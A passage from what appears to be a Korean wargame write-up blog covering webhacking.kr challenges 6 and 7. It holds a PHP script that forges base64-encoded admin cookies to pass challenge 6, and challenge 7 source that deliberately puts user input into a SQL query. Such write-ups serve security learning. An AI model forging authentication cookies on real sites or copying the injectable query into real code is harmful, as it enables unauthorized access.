punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n  <span class=\"token function\">Setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">86400</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"/challenge/web-06/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token function\">Setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">86400</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"/challenge/web-06/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=refresh content=0>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Challenge 6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\r\n<span class=\"token selector\">body</span> <span class=\"token punctuation\">{</span> <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span> <span class=\"token property\">color</span><span class=\"token punctuation\">:</span>white<span class=\"token punctuation\">;</span> <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span>10pt<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$decode_id</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$decode_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$decode_pw</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$decode_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;hr>&lt;a href=./?view_source=1 style=color:yellow;>view-source&lt;/a>&lt;br>&lt;br>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ID : <span class=\"token interpolation\"><span class=\"token variable\">$decode_id</span></span>&lt;br>PW : <span class=\"token interpolation\"><span class=\"token variable\">$decode_pw</span></span>&lt;hr>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$decode_id</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$decode_pw</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"nimda\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>쿠키에 담긴 변수를 대조하여 문제를 풀게 하고 있다.\r\n각 admin, nimda 문자열을 base64암호화를 20회 시킨 후, 위의 소스코드대로 문자열을 바꿔치기해주면 된다.</p>\n<p>위의 코드를 복사해서 약간 수정하여 php 샌드박스에 돌려 보았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">\r\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"nimda\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n    <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  \r\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"val_id = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$val_id</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"val_pw = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n</code></pre></div>\n<p>이 결과값들 각 쿠키 user, passwd에 넣고 새로고침 해주면 문제가 풀린다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"pwned\"></p>","categories":["writeup","wargame","webhacking"],"date":"February 08, 2020","description":"리뉴얼 기념 정주행","id":"866d0d62-56a7-5a0d-8f08-9a62be2cf1cc","keywords":["webhacking.kr"],"slug":"/WriteUp-Webhackingkr-06/","title":"Webhacking.kr 6번","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><img src=\"./images/0.PNG\" alt=\"07\"></p>\n<p>7번 문제는 이렇게 생겼다.</p>\n<p>auth 버튼을 누르면 다음과 같은 경고창이 뜬다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"after click auth\"></p>\n<p>view-source는 아래와 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n  <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"../../config.php\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'view_source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token function\">view_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Challenge 7<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n<span class=\"token variable\">$go</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'val'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$go</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=refresh content=0;url=index.php?val=1>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;html>&lt;head>&lt;title>admin page&lt;/title>&lt;/head>&lt;body bgcolor='black'>&lt;font size=2 color=gray>&lt;b>&lt;h3>Admin page&lt;/h3>&lt;/b>&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/2|-|\\+|from|_|=|\\\\s|\\*|\\//i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$go</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Access Denied!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token function\">dbconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$rand</span><span class=\"token operator\">=</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=((((<span class=\"token interpolation\"><span 